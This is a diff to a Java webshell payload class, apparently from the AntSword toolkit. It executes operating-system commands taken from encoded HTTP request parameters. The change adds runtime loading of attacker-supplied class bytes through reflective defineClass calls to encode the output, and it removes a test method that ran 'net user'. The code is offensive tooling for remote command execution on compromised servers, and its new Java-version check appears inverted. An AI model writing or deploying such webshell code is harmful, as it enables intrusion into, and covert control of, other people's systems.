@@ -16,6 +16,7 @@ public class Exec {
     public String encoder;
     public String cs;
     public String randomPrefix;
+    public String decoderClassdata;
 
     @Override
     public boolean equals(Object obj) {
@@ -51,6 +52,8 @@ public class Exec {
         String varkey1 = "antswordargbin";
         String varkey2 = "antswordargcmd";
         String varkey3 = "antswordargenv";
+        String varkeydecoder = "antswordargdecoder";
+
         try {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
@@ -58,22 +61,16 @@ public class Exec {
             String z1 = decode(request.getParameter(varkey1));
             String z2 = decode(request.getParameter(varkey2));
             String z3 = decode(request.getParameter(varkey3));
+            this.decoderClassdata = decode(request.getParameter(varkeydecoder));
             output.append(ExecuteCommandCode(z1, z2, z3));
         } catch (Exception e) {
             output.append("ERROR:// " + e.toString());
         }
         try {
-            response.getWriter().print(tag_s + output.toString() + tag_e);
+            response.getWriter().print(tag_s + this.asoutput(output.toString()) + tag_e);
         } catch (Exception ignored) {
         }
         return true;
-    }
-
-    public static void main(String[] args) throws Exception {
-        Exec exec = new Exec();
-        exec.cs = "GBK";
-        String result = exec.ExecuteCommandCode("cmd", "net user", "");
-        System.out.println(result);
     }
 
     String decode(String str) throws Exception {
@@ -98,16 +95,7 @@ public class Exec {
             }
             return baos.toString(cs);
         } else if (encoder.equals("base64")) {
-            byte[] bt = null;
-            try {
-                Class clazz = Class.forName("sun.misc.BASE64Decoder");
-                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
-            } catch (ClassNotFoundException e) {
-                Class clazz = Class.forName("java.util.Base64");
-                Object decoder = clazz.getMethod("getDecoder").invoke(null);
-                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
-            }
-            return new String(bt, cs);
+            return new String(this.Base64DecodeToByte(str), this.cs);
         }
         return str;
     }
@@ -151,5 +139,33 @@ public class Exec {
             sb.append(l + "\r\n");
         }
         br.close();
+    }
+    public String asoutput(String str) {
+        try {
+            byte[] classBytes = Base64DecodeToByte(decoderClassdata);
+            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
+            defineClassMethod.setAccessible(true);
+            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0,classBytes.length);
+            return cc.getConstructor(String.class).newInstance(str).toString();
+        } catch (Exception e) {
+            return str;
+        }
+    }
+    public byte[] Base64DecodeToByte(String str) {
+        byte[] bt = null;
+        String version = System.getProperty("java.version");
+        try {
+            if (version.compareTo("1.9") >= 0) {
+                Class clazz = Class.forName("sun.misc.BASE64Decoder");
+                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+            } else {
+                Class clazz = Class.forName("java.util.Base64");
+                Object decoder = clazz.getMethod("getDecoder").invoke(null);
+                bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+            }
+            return bt;
+        }catch (Exception e) {
+            return new byte[]{};
+        }
     }
 }
